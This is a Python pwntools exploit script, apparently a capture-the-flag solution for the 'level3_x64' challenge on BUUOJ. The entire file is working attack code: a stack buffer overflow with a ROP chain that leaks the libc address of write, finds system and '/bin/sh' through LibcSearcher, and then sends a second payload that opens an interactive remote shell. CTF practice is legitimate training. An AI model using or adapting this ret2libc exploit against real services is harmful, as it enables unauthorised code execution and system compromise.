from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29665)
elf = ELF('./level3_x64')
main_addr = elf.symbols['main']
write_plt = elf.plt['write'] 
write_got = elf.got['write']
pop_rdi = 0x4006b3  # pop rdi ; ret
pop_rsi = 0x4006b1  # pop rsi ; pop r15 ; ret
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
io.sendlineafter(b'Input:\n', payload)
write_addr = u64(io.recv(8))
log.info('write_address => 0x%x', write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()